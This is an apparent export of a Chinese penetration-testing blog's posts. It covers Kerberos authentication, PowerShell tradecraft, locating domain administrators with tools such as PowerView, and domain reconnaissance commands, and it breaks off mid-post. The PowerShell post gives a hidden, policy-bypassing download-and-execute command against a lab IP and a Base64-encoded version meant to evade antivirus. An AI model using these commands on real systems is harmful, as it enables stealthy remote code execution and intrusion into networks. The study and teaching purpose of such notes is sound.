id="第一次通信">第一次通信</h3><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以<strong>第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端</strong>，过程如下：</p><img src="/2022/10/19/kerberos/image-20221019173804654.png" alt="image-20221019173804654" style="zoom:50%;"><p><strong>①</strong> 客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；<br><strong>②</strong> KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；<br><strong>③</strong> 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</p><ul><li>第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端<br>即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</li><li>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。</li></ul><p>至此，第一次通信完成。</p><h3 id="第二次通信">第二次通信</h3><p>此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，<br>其次<strong>请求的主要目的是为了获取能够访问目标网络服务的服务授予票据Ticket</strong>（进入动物园需要的门票）。 在第二次通信请求中，客户端将携带三部分内容交给KDc中的TGS，第二次通信过程具体如下所述：</p><img src="/2022/10/19/kerberos/image-20221019174234481.png" alt="image-20221019174234481" style="zoom:50%;"><p>客户端行为：<br><strong>①</strong> 客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；<br><strong>②</strong> 客户端将自己想要访问的Server服务以明文的方式发送给KDC；<br><strong>③</strong> 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；<br>TGS行为：<br><strong>①</strong> 此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。<br><strong>②</strong> TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。<br><strong>③</strong> 如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。<br><strong>④</strong> 此时KDC将返回响应给客户端，响应内容包括：</p><ul><li>第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。</li><li>第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</li></ul><p>至此，第二次通信完成。</p><h3 id="第三次通信">第三次通信</h3><p>此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</p><img src="/2022/10/19/kerberos/image-20221019174800527.png" alt="image-20221019174800527" style="zoom:50%;"><p>客户端：<br><strong>①</strong> 客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。<br>服务端：<br><strong>①</strong> 服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</p><p>至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。</p><h3 id="总结">总结</h3><p>整个kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即他们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。<br>这为整个kerberos认证过程保证了较高的安全性。以下补充两个kerberos认证的整体流图，一个是kerberos认证的时序图，一个是kerberos认证的示意图，望能加深kerberos认证印象~~<br>示意图：</p><img src="/2022/10/19/kerberos/image-20221019175139789.png" alt="image-20221019175139789" style="zoom:50%;"><p>时序图：</p><img src="/2022/10/19/kerberos/image-20221019175201693.png" alt="image-20221019175201693" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell</title>
      <link href="/2022/10/15/Powershell/"/>
      <url>/2022/10/15/Powershell/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍">介绍</h3><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><img src="/2022/10/15/Powershell/image-20221013165216253.png" alt="image-20221013165216253" style="zoom:50%;"><img src="/2022/10/15/Powershell/image-20221013165318603.png" alt="image-20221013165318603" style="zoom:50%;"><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0     windows server 2008</p><p>2.0     windows server 2008 r2、windows 7</p><p>3.0     windows server 2012、windows 8</p><p>4.0     windows server 2012 r2、windows 8.1</p><p>5.0     windows 10</p><p>5.1     windows server 2016</p><h3 id="基本介绍">基本介绍</h3><ul><li>ps1文件</li></ul><p>​ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><ul><li><p>执行策略</p><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><img src="/2022/10/15/Powershell/image-20221013165958649.png" alt="image-20221013165958649" style="zoom:50%;"><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。</p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><img src="/2022/10/15/Powershell/image-20221013170431690.png" alt="image-20221013170431690" style="zoom:50%;"></li><li><p>运行脚本</p><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行</p></li><li><p>管道</p></li></ul><p>​PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>​例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><img src="/2022/10/15/Powershell/image-20221013171111464.png" alt="image-20221013171111464" style="zoom:50%;"><h3 id="一些命令">一些命令</h3><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><ul><li><p>文件操作类命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建目录test：New-Item test -ItemType directory</span><br><span class="line">删除目录test：Remove-Item test</span><br><span class="line">新建文件test.txt：New-Item test.txt -ItemType file</span><br><span class="line">新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件test.txt：Remove-Item test.txt</span><br><span class="line">查看文件test.txt内容：Get-Content  test.txt</span><br><span class="line">设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件test.txt内容：Clear-Content test.txt</span><br></pre></td></tr></table></figure></li><li><p>绕过本地权限并执行</p><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><img src="/2022/10/15/Powershell/image-20221013172448111.png" alt="image-20221013172448111" style="zoom:50%;"></li></ul><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><img src="/2022/10/15/Powershell/image-20221013173324661.png" alt="image-20221013173324661" style="zoom:50%;"><ul><li><p>绕过本地权限并隐藏执行</p><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>或者简写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用base64对命令进行编码</p><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">工具下载地址</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat tmp.txt</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;python ps_encoder.py -s tmp.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 –Enc 指定 Base64 编码内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定位域管理员的6种方式</title>
      <link href="/2022/10/14/Locate_domain_administrators/"/>
      <url>/2022/10/14/Locate_domain_administrators/</url>
      
        <content type="html"><![CDATA[<h3 id="psloggedon">psloggedon</h3><p><strong>1、介绍</strong></p><p>使用条件：PSLoggedOn需要启动Remote Registry Service</p><p>在 Windows 上使用 net session 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户，这是一种存在的局限性。</p><p>PsLoggedOn对本地登录用户的定义是将其配置文件加载到注册表中，因此PsLoggedOn通过扫描 HKEY_USERS 键下的键来确定谁登录。对于名称为用户 SID（安全标识符）的每个密钥， PsLoggedOn 会查找相应的用户名并显示它。为了确定谁通过资源共享登录到计算机， PsLoggedOn使用NetSessionEnum API。请注意，PsLoggedOn将显示您已通过资源共享登录到您查询的远程计算机，因为PsLoggedOn需要登录才能访问远程系统的注册表。</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016184312770.png" alt="image-20221016184312770" style="zoom:50%;"><p><strong>2、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon 下载地址</a></strong></p><p><strong>3、使用用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername|username]</span><br><span class="line"></span><br><span class="line">-                                显示支持的选项和用于输出值的单位。</span><br><span class="line">-l                            仅显示本地登录，不显示本地和网络资源登录。</span><br><span class="line">-x                            不显示登录时间。</span><br><span class="line">\\computername    指定要列出登录信息的计算机的名称。</span><br><span class="line">Username                指定用户名，在网络中搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure><p>-l        仅显示本地登录，不显示本地和网络资源登录。</p><img src="/2022/10/14/Locate_domain_administrators/1665306871466-e4c4e8b1-10f7-4c8c-840b-3997588f2118.png" alt="image-20221013142018112" style="zoom:50%;"><p>\\computername   指定要列出登录信息的计算机的名称，查看谁登陆过这台机器</p><img src="/2022/10/14/Locate_domain_administrators/1665307541478-9cba8196-82f6-4442-b587-a14b9f6a8a9b.png" alt="image-20221013142018112" style="zoom:50%;"><img src="/2022/10/14/Locate_domain_administrators/1665307570106-ab4de206-fe45-4414-acd8-a067605973e0.png" alt="image-20221013142018112" style="zoom:50%;"><p>Username                指定用户名，在网络中搜索该用户登录的计算机。</p><blockquote><p>踩坑：计算机得启用网络发现，并且，默认在域内搜索，不需要指定域，直接输入域用户名称即可。</p></blockquote><img src="/2022/10/14/Locate_domain_administrators/1665309006991-3fd5f405-5266-42b7-9762-ed6982eee095.png" alt="image.png" style="zoom:50%;"><h3 id="PVEFindADUser">PVEFindADUser</h3><p><strong>1、介绍</strong></p><p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。<strong><a href="http://xn--h6qa856gr9i7gt25f29hpp0avncmwhjva898axqx.NET">运行该工具的计算机需要具有.NET</a> Framework 2.0，并且需要具有管理员权限。</strong></p><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser 下载地址</a></p><p><strong>2、用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-h                    显示帮助信息</span><br><span class="line">-u                    检测程序是否有新版本</span><br><span class="line">-current [&quot;username&quot;] -current参数显示域内所有PC上当前登录的用户。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC</span><br><span class="line">-noping               阻止尝试枚举用户登录名之前对目标计算机执行ping命令</span><br><span class="line">-target               此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</span><br></pre></td></tr></table></figure><p>获取域内所有目标计算机上当前登录的所有用户<br>pveFindADUser.exe -current</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016192522075.png" alt="image-20221016192522075" style="zoom:50%;"><p>指定了用户名(DOMAIN\Username)，则显示该用户登录的计算机<br>pveFindADUser.exe -current “FZM\Lisi”</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016193157427.png" alt="image-20221016193157427" style="zoom:50%;"><h3 id="netview">netview</h3><p><strong>1.介绍</strong></p><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p><a href="https://github.com/mubix/netview">Netview 下载地址</a></p><p><strong>2、用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h               显示帮助信息</span><br><span class="line">-f filename.txt  指定要提取主机列表的文件</span><br><span class="line">-e filename.txt  指定要排除的主机名的文件</span><br><span class="line">-o filename.txt  将所有输出重定向到指定的文件</span><br><span class="line">-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</span><br><span class="line">-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">-c               对已找到的共享目录/文件的访问权限进行检查</span><br><span class="line">-i interval      枚举主机之间等待的秒数</span><br><span class="line">-j jitter        应用于间隔的抖动百分比（0.0-1.0）</span><br></pre></td></tr></table></figure><p>-d      列出域内主机的NetSessionEnum，NetShareEnum，NetWkstaUserEnum</p><img src="/2022/10/14/Locate_domain_administrators/image-20221013142018112.png" alt="image-20221013142018112" style="zoom:50%;"><h3 id="NSE-脚本">NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-domains.nse">smb-enum-domains.nse</a>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-users.nse">smb-enum-users.nse</a>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-shares.nse">smb-enum-shares.nse</a>:遍历远程主机的共享目录</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-processes.nse">smb-enum-processes.nse</a>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-sessions.nse">smb-enum-sessions.nse</a>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-os-discovery.nse">smb-os-discovery.nse</a>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016195135590.png" alt="image-20221016195135590" style="zoom:50%;"><img src="/2022/10/14/Locate_domain_administrators/image-20221016195252632.png" alt="image-20221016195252632" style="zoom:50%;"><h3 id="PowerView-脚本">PowerView 脚本</h3><p>1、介绍</p><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code>$Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code>Import-Module PowerView</code>即可导入PowerView，使用<code>Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView 脚本下载地址</a></p><p>2、使用</p><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016204101110.png" alt="image-20221016204101110" style="zoom:80%;"><p>PowerView 中的其他信息收集模块：</p><ul><li><p>Get-NetDomain:获取当前用户所在域名称</p></li><li><p>Get-NetUser：</p><p>获取所有用户的详细信息</p></li><li><p>Get-NetDomainController：</p><p>获取所有域控制器的信息</p></li><li><p>Get-NetComputer：</p><p>获取域内所有机器的详细信息</p></li><li><p>Get-NetOU：</p><p>获取域中的OU信息</p></li><li><p>Get-NetGroup：</p><p>获取所有域内组和组成员信息</p></li><li><p>Get-NetFileServer：</p><p>根据SPN获取当前域使用的文件服务器信息</p></li><li><p>Get-NetShare：</p><p>获取当前域内所有的网络共享信息</p></li><li><p>Get-NetSession：</p><p>获取指定服务器的会话</p></li><li><p>Get-NetRDPSession：</p><p>获取指定服务器的远程连接</p></li><li><p>Get-NetProcess：</p><p>获取远程主机的进程</p></li><li><p>Get-UserEvent：</p><p>获取指定用户的日志</p></li><li><p>Get-ADObject：</p><p>获取活动目录的对象</p></li><li><p>Get-NetGPO：</p><p>获取域内所有组的策略对象</p></li><li><p>Get-DomainPolicy：</p><p>获取域默认策略或域控制器策略</p></li><li><p>Invoke-UserHunter：</p><p>获取域用户登陆的计算机信息及该用户是否有本地管理员权限</p></li><li><p>Invoke-ProcessHunter：</p><p>通过查询域内所有的机器进程找到特定用户</p></li><li><p>Invoke-UserEventHunter：</p><p>根据用户日志查询某域用户登陆过哪些域机器</p></li></ul><p><img src="/2022/10/14/Locate_domain_administrators/image-20221016204536485.png" alt="image-20221016204536485"></p><h3 id="Empire">Empire</h3><p>不常用，暂时不看，留着坑位</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内信息收集</title>
      <link href="/2022/10/13/Intra-domain_information_collection/"/>
      <url>/2022/10/13/Intra-domain_information_collection/</url>
      
        <content type="html"><![CDATA[<h3 id="判断是否存在域">判断是否存在域</h3><ul><li>ifconfig</li></ul><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103430393.png" alt="image-20221013103430393"><br>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP<br><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103501517.png" alt="image-20221013103501517"></p><ul><li>系统详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303896642-04459935-5a9e-4d75-89e6-3438668c5f68.png" alt="image.png"></p><ul><li>当前登录域与域用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303846049-dbf18c49-6245-4240-a739-e7dbedc63fea.png" alt="image.png"></p><ul><li>判断主域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303931947-0bf1e5c6-b1f9-46be-ba38-3ffd82085bea.png" alt="image.png"></p><h3 id="收集域内基础信息">收集域内基础信息</h3><ul><li>查看域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><ul><li>查看域内计算机</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:domain_name</span><br></pre></td></tr></table></figure><ul><li>查看域内用户组列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303685975-daa91283-3d11-4fcc-8c3a-78caa70581c8.png" alt="image.png"></p><ul><li>查看域用户组信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304025868-53b09d01-c2fd-4487-af0e-7fea3a90e897.png" alt="image.png"></p><ul><li>查看域密码策略信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304059956-323a4cdd-f0e6-47cf-a121-59755776408b.png" alt="image.png"></p><ul><li>查看域信任信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304109275-c8f0067a-017a-498d-978c-f3962ac88ca7.png" alt="image.png"></p><h3 id="收集域用户和管理员信息">收集域用户和管理员信息</h3><ul><li>查询域用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img 